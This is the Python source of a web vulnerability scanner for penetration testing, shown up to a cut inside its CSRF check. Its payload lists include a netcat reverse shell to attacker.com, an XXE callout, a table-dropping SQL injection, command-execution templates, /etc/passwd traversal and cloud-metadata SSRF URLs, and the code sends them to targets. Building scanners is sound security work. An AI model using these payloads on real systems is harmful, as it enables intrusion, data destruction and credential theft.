#!/usr/bin/env python3
"""
Advanced Web Vulnerability Scanner v2.0
A comprehensive, high-tech penetration testing toolkit for authorized security assessments.

Features:
- Async/concurrent scanning for faster performance
- Web crawling and URL discovery
- Technology fingerprinting (CMS, frameworks, servers)
- Subdomain enumeration
- Port scanning
- Multiple vulnerability tests (SQLi, XSS, CSRF, SSRF, SSTI, XXE, etc.)
- API security testing (REST, GraphQL)
- JWT security analysis
- WebSocket security testing
- Command injection detection
- Deserialization vulnerability testing
- Rate limiting bypass testing
- Comprehensive reporting (JSON, HTML)
"""

import requests
import argparse
import logging
import json
import re
import socket
import ssl
import hashlib
import base64
import time
import threading
import concurrent.futures
from datetime import datetime
from typing import List, Dict, Set, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict
from enum import Enum
from collections import defaultdict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from bs4 import BeautifulSoup
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

# --- Configuration ---
VERSION = "2.0.0"
BANNER = f"""
╔══════════════════════════════════════════════════════════════════╗
║           Advanced Web Vulnerability Scanner v{VERSION}              ║
║          Comprehensive Security Assessment Toolkit               ║
╠══════════════════════════════════════════════════════════════════╣
║  ⚠️  ETHICAL USE WARNING                                          ║
║  This tool is for authorized security testing ONLY.              ║
║  Unauthorized use against systems you don't own or have          ║
║  explicit permission to test is ILLEGAL and UNETHICAL.           ║
║  The user assumes ALL responsibility for actions performed.      ║
╚══════════════════════════════════════════════════════════════════╝
"""

# Set up logging with colors
class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors for terminal output."""
    COLORS = {
        'DEBUG': '\033[36m',      # Cyan
        'INFO': '\033[32m',       # Green
        'WARNING': '\033[33m',    # Yellow
        'ERROR': '\033[31m',      # Red
        'CRITICAL': '\033[35m',   # Magenta
        'RESET': '\033[0m'
    }

    def format(self, record):
        color = self.COLORS.get(record.levelname, self.COLORS['RESET'])
        reset = self.COLORS['RESET']
        record.levelname = f"{color}{record.levelname}{reset}"
        return super().format(record)

# Configure logging
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter('%(asctime)s - %(levelname)s - %(message)s'))
logging.basicConfig(level=logging.INFO, handlers=[handler])
logger = logging.getLogger(__name__)

# --- Severity Levels ---
class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

# --- Finding Data Class ---
@dataclass
class Finding:
    """Represents a security finding."""
    vulnerability_type: str
    severity: Severity
    url: str
    detail: str
    payload: Optional[str] = None
    evidence: Optional[str] = None
    remediation: Optional[str] = None
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        d = asdict(self)
        d['severity'] = self.severity.value
        return d

# --- Technology Signatures ---
TECH_SIGNATURES = {
    "WordPress": {
        "patterns": ["/wp-content/", "/wp-includes/", "wp-json", "wordpress"],
        "headers": {"X-Powered-By": "WordPress"},
        "meta": {"generator": "WordPress"}
    },
    "Drupal": {
        "patterns": ["/sites/all/", "/sites/default/", "Drupal.settings"],
        "headers": {"X-Generator": "Drupal"},
        "meta": {"generator": "Drupal"}
    },
    "Joomla": {
        "patterns": ["/components/", "/modules/", "/templates/", "joomla"],
        "headers": {},
        "meta": {"generator": "Joomla"}
    },
    "Django": {
        "patterns": ["csrfmiddlewaretoken", "__admin__"],
        "headers": {"X-Frame-Options": "SAMEORIGIN"},
        "meta": {}
    },
    "Laravel": {
        "patterns": ["laravel_session", "XSRF-TOKEN"],
        "headers": {},
        "meta": {}
    },
    "Express.js": {
        "patterns": [],
        "headers": {"X-Powered-By": "Express"},
        "meta": {}
    },
    "ASP.NET": {
        "patterns": ["__VIEWSTATE", "__EVENTVALIDATION", ".aspx"],
        "headers": {"X-AspNet-Version": "", "X-Powered-By": "ASP.NET"},
        "meta": {}
    },
    "PHP": {
        "patterns": [".php"],
        "headers": {"X-Powered-By": "PHP"},
        "meta": {}
    },
    "Ruby on Rails": {
        "patterns": ["_rails_", "rails-ujs"],
        "headers": {"X-Runtime": ""},
        "meta": {}
    },
    "Flask": {
        "patterns": [],
        "headers": {"Server": "Werkzeug"},
        "meta": {}
    },
    "Spring": {
        "patterns": ["/actuator", "/health", "/info"],
        "headers": {},
        "meta": {}
    },
    "Nginx": {
        "patterns": [],
        "headers": {"Server": "nginx"},
        "meta": {}
    },
    "Apache": {
        "patterns": [],
        "headers": {"Server": "Apache"},
        "meta": {}
    },
    "Cloudflare": {
        "patterns": [],
        "headers": {"Server": "cloudflare", "CF-RAY": ""},
        "meta": {}
    }
}

# --- Default Payloads ---
DEFAULT_SQLI_PAYLOADS = [
    "'", "''", "\"", "\\", "`",
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
    "' OR 1=1--", "') OR ('1'='1", "1' ORDER BY 1--",
    "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
    "' AND 1=1--", "' AND 1=2--",
    "1; DROP TABLE users--", "'; EXEC xp_cmdshell('whoami')--",
    "' WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
]

DEFAULT_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "\"/><script>alert('XSS')</script>",
    "'-alert(1)-'", "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<<script>alert('XSS');//<</script>",
    "<iframe src='javascript:alert(1)'>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}", "<%=alert(1)%>",
    "<math><maction xlink:href='javascript:alert(1)'>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>"
]

DEFAULT_DIR_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd", "../../../../etc/passwd",
    "../../../etc/passwd", "....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5cWindows\\System32\\config\\SAM",
    "/etc/passwd%00", "....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "file:///etc/passwd", "php://filter/read=convert.base64-encode/resource=index.php"
]

DEFAULT_SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>",
    "{{config}}", "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "#{7*7}", "@(7*7)", "*{7*7}"
]

DEFAULT_CMD_INJECTION_PAYLOADS = [
    "; ls -la", "| ls -la", "& dir", "&& whoami",
    "|| cat /etc/passwd", "`id`", "$(id)",
    "; ping -c 4 127.0.0.1", "| nc -e /bin/sh attacker.com 1234",
    "\nwhoami", "\r\ndir", ";cat${IFS}/etc/passwd"
]

DEFAULT_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>'
]

DEFAULT_SSRF_PAYLOADS = [
    "http://localhost", "http://127.0.0.1",
    "http://[::1]", "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",  # GCP metadata
    "http://169.254.169.254/metadata/v1/",  # Digital Ocean
    "http://127.0.0.1:22", "http://127.0.0.1:3306",
    "gopher://localhost:25/", "dict://localhost:11211/"
]

DEFAULT_LDAP_INJECTION_PAYLOADS = [
    "*", "*)(&", "*)(|(&", "*()|%26'",
    "admin*", "*))(|(cn=*", "*))(|(uid=*"
]

DEFAULT_WEAK_USERNAMES = ["admin", "root", "test", "user", "administrator", "guest", "demo", "support"]
DEFAULT_WEAK_PASSWORDS = ["password", "123456", "admin", "root", "test", "qwerty", "letmein", "welcome", "Password1!", "admin123"]

# Common ports for scanning
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080, 8443]

# Print banner
print(BANNER)

class WebVulnerabilityScanner:
    """
    Advanced Web Vulnerability Scanner with comprehensive security testing capabilities.
    
    Features:
    - Async/concurrent scanning
    - Web crawling
    - Technology fingerprinting
    - Multiple vulnerability tests
    - Detailed reporting
    """
    
    def __init__(self, base_url: str, args):
        """Initialize the scanner with target URL and configuration."""
        if not base_url.startswith(('http://', 'https://')):
            self.base_url = 'http://' + base_url
        else:
            self.base_url = base_url
        
        self.parsed_url = urlparse(self.base_url)
        self.args = args
        self.start_time = datetime.now()
        
        # Thread lock for thread-safe operations
        self._lock = threading.Lock()
        
        # Use a session object to persist cookies
        self.session = requests.Session()
        self._setup_session()
        
        # Load payloads
        self.sqli_payloads = self._load_payloads(getattr(args, 'sqli_payloads', None), DEFAULT_SQLI_PAYLOADS)
        self.xss_payloads = self._load_payloads(getattr(args, 'xss_payloads', None), DEFAULT_XSS_PAYLOADS)
        self.dir_payloads = self._load_payloads(getattr(args, 'dir_payloads', None), DEFAULT_DIR_TRAVERSAL_PAYLOADS)
        self.ssti_payloads = DEFAULT_SSTI_PAYLOADS
        self.cmd_payloads = DEFAULT_CMD_INJECTION_PAYLOADS
        self.xxe_payloads = DEFAULT_XXE_PAYLOADS
        self.ssrf_payloads = DEFAULT_SSRF_PAYLOADS
        self.ldap_payloads = DEFAULT_LDAP_INJECTION_PAYLOADS
        self.weak_usernames = self._load_payloads(getattr(args, 'username_list', None), DEFAULT_WEAK_USERNAMES)
        self.weak_passwords = self._load_payloads(getattr(args, 'password_list', None), DEFAULT_WEAK_PASSWORDS)
        
        # Data storage
        self.discovered_forms: List[Dict] = []
        self.discovered_urls: Set[str] = set()
        self.discovered_endpoints: Set[str] = set()
        self.findings: List[Finding] = []
        self.technologies_detected: Dict[str, List[str]] = defaultdict(list)
        self.open_ports: List[int] = []
        self.subdomains: Set[str] = set()
        self.api_endpoints: List[Dict] = []
        self.js_files: Set[str] = set()
        
        # Statistics
        self.stats = {
            "requests_sent": 0,
            "forms_discovered": 0,
            "urls_crawled": 0,
            "vulnerabilities_found": 0
        }

    def _setup_session(self):
        """Configure the HTTP session with appropriate headers."""
        software_names = [sn.value for sn in SoftwareName]
        operating_systems = [os.value for os in OperatingSystem]
        
        self.session.headers.update({
            "User-Agent": UserAgent(
                software_names=software_names,
                operating_systems=operating_systems
            ).get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })

    def _load_payloads(self, filepath: Optional[str], default_payloads: List[str]) -> List[str]:
        """Load payloads from a file, falling back to defaults if not found."""
        if filepath:
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                if payloads:
                    logger.info(f"Loaded {len(payloads)} payloads from {filepath}")
                    return payloads
                else:
                    logger.warning(f"Payload file {filepath} is empty, using defaults.")
            except FileNotFoundError:
                logger.warning(f"Payload file {filepath} not found, using defaults.")
            except Exception as e:
                logger.error(f"Error reading payload file {filepath}: {e}. Using defaults.")
        
        logger.debug(f"Using default payloads ({len(default_payloads)}).")
        return default_payloads

    def _send_request(
        self, 
        url: str, 
        method: str = "GET", 
        data: Optional[Dict] = None, 
        json_data: Optional[Dict] = None,
        files: Optional[Dict] = None, 
        cookies: Optional[Dict] = None, 
        headers: Optional[Dict] = None,
        allow_redirects: bool = True, 
        timeout: int = 10
    ) -> Optional[requests.Response]:
        """Send an HTTP request with comprehensive error handling."""
        with self._lock:
            self.stats["requests_sent"] += 1
        
        try:
            request_headers = self.session.headers.copy()
            if headers:
                request_headers.update(headers)
            
            verify_ssl = getattr(self.args, 'verify_ssl', True)
            
            if method.upper() == "GET":
                response = self.session.get(
                    url, params=data, verify=verify_ssl, 
                    timeout=timeout, allow_redirects=allow_redirects, 
                    cookies=cookies, headers=request_headers
                )
            elif method.upper() == "POST":
                if json_data:
                    response = self.session.post(
                        url, json=json_data, verify=verify_ssl,
                        timeout=timeout, allow_redirects=allow_redirects,
                        cookies=cookies, headers=request_headers
                    )
                else:
                    response = self.session.post(
                        url, data=data, files=files, verify=verify_ssl,
                        timeout=timeout, allow_redirects=allow_redirects,
                        cookies=cookies, headers=request_headers
                    )
            elif method.upper() == "PUT":
                response = self.session.put(
                    url, data=data, json=json_data, verify=verify_ssl,
                    timeout=timeout, allow_redirects=allow_redirects,
                    cookies=cookies, headers=request_headers
                )
            elif method.upper() == "DELETE":
                response = self.session.delete(
                    url, verify=verify_ssl, timeout=timeout,
                    allow_redirects=allow_redirects, cookies=cookies,
                    headers=request_headers
                )
            elif method.upper() == "OPTIONS":
                response = self.session.options(
                    url, verify=verify_ssl, timeout=timeout,
                    headers=request_headers
                )
            elif method.upper() == "HEAD":
                response = self.session.head(
                    url, verify=verify_ssl, timeout=timeout,
                    allow_redirects=allow_redirects, headers=request_headers
                )
            else:
                logger.error(f"Unsupported HTTP method: {method}")
                return None
            
            return response
            
        except requests.exceptions.SSLError as e:
            logger.debug(f"SSL Error for {url}: {e}")
            return None
        except requests.exceptions.Timeout:
            logger.debug(f"Request timed out for {url} (timeout={timeout}s)")
            return None
        except requests.exceptions.ConnectionError as e:
            logger.debug(f"Connection error for {url}: {e}")
            return None
        except requests.exceptions.RequestException as e:
            logger.debug(f"Request error for {url}: {e}")
            return None
        except Exception as e:
            logger.debug(f"Unexpected error during request to {url}: {e}")
            return None

    def _add_finding(
        self, 
        vulnerability_type: str, 
        severity: Severity,
        url: str, 
        detail: str, 
        payload: Optional[str] = None, 
        evidence: Optional[str] = None,
        remediation: Optional[str] = None,
        cwe_id: Optional[str] = None,
        cvss_score: Optional[float] = None
    ):
        """Add a structured finding to the list."""
        finding = Finding(
            vulnerability_type=vulnerability_type,
            severity=severity,
            url=url,
            detail=detail,
            payload=payload,
            evidence=evidence[:500] if evidence else None,
            remediation=remediation,
            cwe_id=cwe_id,
            cvss_score=cvss_score
        )
        
        with self._lock:
            self.findings.append(finding)
            self.stats["vulnerabilities_found"] += 1
        
        severity_colors = {
            Severity.CRITICAL: '\033[35m',  # Magenta
            Severity.HIGH: '\033[31m',      # Red
            Severity.MEDIUM: '\033[33m',    # Yellow
            Severity.LOW: '\033[36m',       # Cyan
            Severity.INFO: '\033[32m'       # Green
        }
        color = severity_colors.get(severity, '\033[0m')
        reset = '\033[0m'
        
        logger.warning(
            f"{color}[{severity.value}]{reset} {vulnerability_type} - {url}"
            + (f" | Payload: {payload}" if payload else "")
        )

    def discover_forms(self, url: str):
        """Find and analyze forms on a given URL."""
        logger.info(f"🔍 Discovering forms on {url}")
        response = self._send_request(url)
        if not response:
            return

        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        logger.info(f"Found {len(forms)} forms on {url}")
        
        for form in forms:
            action = form.get("action")
            method = form.get("method", "GET").upper()
            form_url = urljoin(url, action) if action else url
            enctype = form.get("enctype", "application/x-www-form-urlencoded")
            
            inputs = {}
            for input_tag in form.find_all(["input", "textarea", "select"]):
                name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                value = input_tag.get("value", "")
                if name:
                    inputs[name] = {'type': input_type, 'value': value}
                    
            if inputs:
                form_data = {
                    "url": form_url, 
                    "method": method, 
                    "inputs": inputs,
                    "enctype": enctype
                }
                self.discovered_forms.append(form_data)
                with self._lock:
                    self.stats["forms_discovered"] += 1
                logger.debug(f"Discovered form: {form_url} ({method})")

    # --- Advanced Discovery Methods ---
    
    def crawl_website(self, max_depth: int = 2, max_pages: int = 50):
        """Crawl the website to discover URLs and endpoints."""
        logger.info(f"🕷️ Starting web crawl (max depth: {max_depth}, max pages: {max_pages})")
        
        visited = set()
        to_visit = [(self.base_url, 0)]
        
        while to_visit and len(visited) < max_pages:
            current_url, depth = to_visit.pop(0)
            
            if current_url in visited or depth > max_depth:
                continue
                
            # Only crawl URLs on the same domain
            parsed = urlparse(current_url)
            if parsed.netloc != self.parsed_url.netloc:
                continue
            
            visited.add(current_url)
            self.discovered_urls.add(current_url)
            
            response = self._send_request(current_url)
            if not response:
                continue
                
            with self._lock:
                self.stats["urls_crawled"] += 1
            
            soup = BeautifulSoup(response.text, "html.parser")
            
            # Find all links
            for link in soup.find_all(['a', 'link'], href=True):
                href = link['href']
                full_url = urljoin(current_url, href)
                parsed_link = urlparse(full_url)
                
                # Only follow links on the same domain
                if parsed_link.netloc == self.parsed_url.netloc:
                    if full_url not in visited:
                        to_visit.append((full_url, depth + 1))
            
            # Find JavaScript files
            for script in soup.find_all('script', src=True):
                js_url = urljoin(current_url, script['src'])
                self.js_files.add(js_url)
            
            # Find forms on this page
            self.discover_forms(current_url)
            
            # Extract API endpoints from JavaScript
            self._extract_endpoints_from_response(response.text)
        
        logger.info(f"Crawl complete. Discovered {len(self.discovered_urls)} URLs, {len(self.js_files)} JS files")

    def _extract_endpoints_from_response(self, content: str):
        """Extract potential API endpoints from response content."""
        # Common API endpoint patterns
        patterns = [
            r'["\']/(api|v[0-9]+)/[a-zA-Z0-9/_-]+["\']',
            r'["\']https?://[^"\']+/(api|v[0-9]+)/[a-zA-Z0-9/_-]+["\']',
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.[a-z]+\(["\']([^"\']+)["\']',
            r'\.ajax\(\s*{\s*url:\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    endpoint = match[0] if match[0].startswith('/') else '/' + match[0]
                else:
                    endpoint = match if match.startswith('/') else '/' + match
                self.discovered_endpoints.add(endpoint)

    def fingerprint_technologies(self):
        """Detect technologies used by the target website."""
        logger.info("🔬 Fingerprinting technologies...")
        
        response = self._send_request(self.base_url)
        if not response:
            logger.error("Cannot fingerprint; initial request failed.")
            return
        
        headers = response.headers
        content = response.text.lower()
        
        # Check each technology signature
        for tech_name, signatures in TECH_SIGNATURES.items():
            detected = False
            
            # Check URL patterns in content
            for pattern in signatures.get("patterns", []):
                if pattern.lower() in content:
                    detected = True
                    self.technologies_detected[tech_name].append(f"Pattern: {pattern}")
            
            # Check headers
            for header_name, header_value in signatures.get("headers", {}).items():
                if header_name in headers:
                    if not header_value or header_value.lower() in headers[header_name].lower():
                        detected = True
                        self.technologies_detected[tech_name].append(f"Header: {header_name}")
            
            # Check meta tags
            soup = BeautifulSoup(response.text, "html.parser")
            for meta_name, meta_content in signatures.get("meta", {}).items():
                meta_tag = soup.find("meta", attrs={"name": meta_name})
                if meta_tag:
                    if not meta_content or meta_content.lower() in meta_tag.get("content", "").lower():
                        detected = True
                        self.technologies_detected[tech_name].append(f"Meta: {meta_name}")
            
            if detected:
                logger.info(f"  ✓ Detected: {tech_name}")
        
        # Additional checks
        self._check_robots_txt()
        self._check_sitemap()
        self._check_security_txt()

    def _check_robots_txt(self):
        """Check for robots.txt and extract information."""
        robots_url = urljoin(self.base_url, "/robots.txt")
        response = self._send_request(robots_url)
        
        if response and response.status_code == 200:
            logger.info("  ✓ robots.txt found")
            # Extract disallowed paths
            for line in response.text.split('\n'):
                if line.lower().startswith('disallow:'):
                    path = line.split(':', 1)[1].strip()
                    if path:
                        self.discovered_endpoints.add(path)

    def _check_sitemap(self):
        """Check for sitemap.xml."""
        sitemap_url = urljoin(self.base_url, "/sitemap.xml")
        response = self._send_request(sitemap_url)
        
        if response and response.status_code == 200:
            logger.info("  ✓ sitemap.xml found")
            # Parse sitemap for URLs
            soup = BeautifulSoup(response.text, "xml")
            for loc in soup.find_all("loc"):
                self.discovered_urls.add(loc.text)

    def _check_security_txt(self):
        """Check for .well-known/security.txt."""
        security_paths = ["/.well-known/security.txt", "/security.txt"]
        for path in security_paths:
            security_url = urljoin(self.base_url, path)
            response = self._send_request(security_url)
            
            if response and response.status_code == 200:
                logger.info(f"  ✓ security.txt found at {path}")
                self._add_finding(
                    "Security Contact Information",
                    Severity.INFO,
                    security_url,
                    "Security contact information available",
                    evidence=response.text[:500]
                )
                break

    def scan_ports(self, ports: List[int] = None, timeout: float = 1.0):
        """Scan common ports on the target host."""
        if ports is None:
            ports = COMMON_PORTS
        
        logger.info(f"🔌 Scanning {len(ports)} common ports on {self.parsed_url.netloc}...")
        host = self.parsed_url.hostname
        
        def check_port(port: int) -> Optional[int]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    return port
            except Exception:
                pass
            return None
        
        # Use ThreadPoolExecutor for concurrent port scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_port, port): port for port in ports}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self.open_ports.append(result)
                    logger.info(f"  ✓ Port {result} is open")
        
        if self.open_ports:
            self._add_finding(
                "Open Ports Detected",
                Severity.INFO,
                self.base_url,
                f"Found {len(self.open_ports)} open ports",
                evidence=f"Open ports: {sorted(self.open_ports)}"
            )

    def enumerate_subdomains(self, wordlist: List[str] = None):
        """Enumerate subdomains using DNS resolution."""
        logger.info("🌐 Enumerating subdomains...")
        
        if wordlist is None:
            wordlist = [
                "www", "mail", "ftp", "admin", "api", "dev", "staging", "test",
                "blog", "shop", "store", "cdn", "static", "app", "mobile", "m",
                "portal", "vpn", "remote", "secure", "beta", "alpha", "demo",
                "support", "help", "docs", "wiki", "status", "monitor", "ns1", "ns2"
            ]
        
        base_domain = self.parsed_url.netloc
        # Remove www. prefix if present
        if base_domain.startswith("www."):
            base_domain = base_domain[4:]
        
        def check_subdomain(subdomain: str) -> Optional[str]:
            full_domain = f"{subdomain}.{base_domain}"
            try:
                socket.gethostbyname(full_domain)
                return full_domain
            except socket.gaierror:
                return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_subdomain, sub): sub for sub in wordlist}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self.subdomains.add(result)
                    logger.info(f"  ✓ Found subdomain: {result}")
        
        if self.subdomains:
            self._add_finding(
                "Subdomains Discovered",
                Severity.INFO,
                self.base_url,
                f"Found {len(self.subdomains)} subdomains",
                evidence=str(list(self.subdomains)[:20])
            )

    # --- Vulnerability Test Methods ---

    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities using multiple techniques."""
        logger.info("💉 Testing for SQL Injection vulnerabilities...")
        
        # Test URL parameters
        parsed = urlparse(self.base_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            logger.info("Testing URL parameters for SQLi...")
            
            for param_name in query_params:
                for payload in self.sqli_payloads:
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    # Error-based detection
                    response = self._send_request(test_url)
                    if response and self._check_sql_errors(response.text):
                        self._add_finding(
                            "SQL Injection (Error-Based)",
                            Severity.CRITICAL,
                            test_url,
                            f"Error-based SQLi detected in parameter '{param_name}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Use parameterized queries or prepared statements",
                            cwe_id="CWE-89",
                            cvss_score=9.8
                        )
                        break  # Found vuln, move to next parameter

        # Test discovered forms
        logger.info("Testing discovered forms for SQLi...")
        for form in self.discovered_forms:
            form_url = form['url']
            method = form['method']
            
            for input_name in form['inputs']:
                for payload in self.sqli_payloads[:10]:  # Limit payloads for forms
                    test_data = {name: form['inputs'][name].get('value', 'test') for name in form['inputs']}
                    test_data[input_name] = payload
                    
                    response = self._send_request(form_url, method=method, data=test_data)
                    if response and self._check_sql_errors(response.text):
                        self._add_finding(
                            "SQL Injection (Error-Based)",
                            Severity.CRITICAL,
                            form_url,
                            f"Error-based SQLi detected in form field '{input_name}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Use parameterized queries or prepared statements",
                            cwe_id="CWE-89",
                            cvss_score=9.8
                        )
                        break

        # Time-based blind SQLi test (limited)
        self._test_time_based_sqli()
        
        logger.info("SQL Injection testing complete.")

    def _check_sql_errors(self, content: str) -> bool:
        """Check for common SQL error messages in response."""
        sql_errors = [
            "sql syntax", "mysql", "sqlite", "postgresql", "ora-",
            "syntax error", "unclosed quotation mark", "unterminated string",
            "query failed", "database error", "sql error", "odbc error",
            "microsoft sql server", "invalid query", "pg_query",
            "sqlite3::", "warning: mysql", "valid mysql result",
            "you have an error in your sql syntax"
        ]
        content_lower = content.lower()
        return any(error in content_lower for error in sql_errors)

    def _test_time_based_sqli(self):
        """Test for time-based blind SQL injection."""
        time_payloads = [
            ("' AND SLEEP(5)--", 5),
            ("'; WAITFOR DELAY '0:0:5'--", 5),
            ("' OR SLEEP(5)#", 5)
        ]
        
        # Only test on discovered endpoints with parameters
        parsed = urlparse(self.base_url)
        if not parsed.query:
            return
            
        query_params = parse_qs(parsed.query)
        for param_name in list(query_params.keys())[:2]:  # Limit to first 2 params
            for payload, expected_delay in time_payloads:
                test_params = query_params.copy()
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                start_time = time.time()
                response = self._send_request(test_url, timeout=expected_delay + 5)
                elapsed = time.time() - start_time
                
                if response and elapsed >= expected_delay:
                    self._add_finding(
                        "SQL Injection (Time-Based Blind)",
                        Severity.CRITICAL,
                        test_url,
                        f"Time-based blind SQLi detected in parameter '{param_name}' (delay: {elapsed:.2f}s)",
                        payload=payload,
                        remediation="Use parameterized queries or prepared statements",
                        cwe_id="CWE-89",
                        cvss_score=9.8
                    )
                    return  # Found, no need to continue

    def test_xss(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        logger.info("📝 Testing for XSS vulnerabilities...")
        
        # Test URL parameters
        parsed = urlparse(self.base_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            logger.info("Testing URL parameters for XSS...")
            
            for param_name in query_params:
                for payload in self.xss_payloads:
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self._send_request(test_url)
                    if response and payload in response.text:
                        self._add_finding(
                            "Cross-Site Scripting (Reflected XSS)",
                            Severity.HIGH,
                            test_url,
                            f"Reflected XSS detected in parameter '{param_name}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Implement proper output encoding and Content-Security-Policy",
                            cwe_id="CWE-79",
                            cvss_score=6.1
                        )
                        break

        # Test discovered forms
        logger.info("Testing discovered forms for XSS...")
        for form in self.discovered_forms:
            form_url = form['url']
            method = form['method']
            
            for input_name, details in form['inputs'].items():
                if details.get('type') == 'password':
                    continue
                    
                for payload in self.xss_payloads[:10]:
                    test_data = {name: form['inputs'][name].get('value', 'test') for name in form['inputs']}
                    test_data[input_name] = payload
                    
                    response = self._send_request(form_url, method=method, data=test_data)
                    if response and payload in response.text:
                        self._add_finding(
                            "Cross-Site Scripting (Reflected XSS)",
                            Severity.HIGH,
                            form_url,
                            f"Reflected XSS detected in form field '{input_name}'",
                            payload=payload,
                            evidence=response.text[:500],
                            remediation="Implement proper output encoding and Content-Security-Policy",
                            cwe_id="CWE-79",
                            cvss_score=6.1
                        )
                        break

        # Test for DOM-based XSS indicators
        self._test_dom_xss()
        
        logger.info("XSS testing complete.")

    def _test_dom_xss(self):
        """Check for potential DOM-based XSS patterns."""
        response = self._send_request(self.base_url)
        if not response:
            return
            
        dom_xss_patterns = [
            r'document\.write\s*\(',
            r'document\.writeln\s*\(',
            r'\.innerHTML\s*=',
            r'\.outerHTML\s*=',
            r'eval\s*\(',
            r'setTimeout\s*\([^,]*document\.',
            r'setInterval\s*\([^,]*document\.',
            r'location\s*=',
            r'location\.href\s*=',
            r'\.replace\s*\([^)]*location'
        ]
        
        for pattern in dom_xss_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                self._add_finding(
                    "Potential DOM-based XSS",
                    Severity.MEDIUM,
                    self.base_url,
                    f"DOM XSS sink pattern detected: {pattern}",
                    remediation="Review JavaScript code for unsafe DOM manipulation",
                    cwe_id="CWE-79"
                )
                break

    def test_csrf(self):
        """Test for Cross-Site Request Forgery vulnerabilities."""
        logger.info("🔄 Testing for CSRF vulnerabilities...")
        
        csrf_names = [
            'csrf_token', 'csrfmiddlewaretoken', '__requestverificationtoken',
            'nonce', '_token', 'authenticity_token', '_csrf', 'csrf',
            'xsrf_token', '_xsrf'
        ]
        
        # Check discovered forms
        for form in self.discovered_forms:
            if form['method'] == 'POST':
                has_csrf_token = False
                
                for input_name, details in form['inputs'].items():
                    if input_name.lower() in csrf_names or (
                        details.get('type') == 'hidden' and 
                        any(token in input_name.lower() for token in ['token', 'csrf', 'nonce'])
                    ):
                        has_csrf_token = True
                        break
                
                if not has_csrf_token:
                    self._add_finding(
                        "Cross-Site Request Forgery (CSRF)",
                        Severity.MEDIUM,
                        form['url'],
                        "POST form lacks CSRF protection token",
                        evidence=str(form['inputs']),
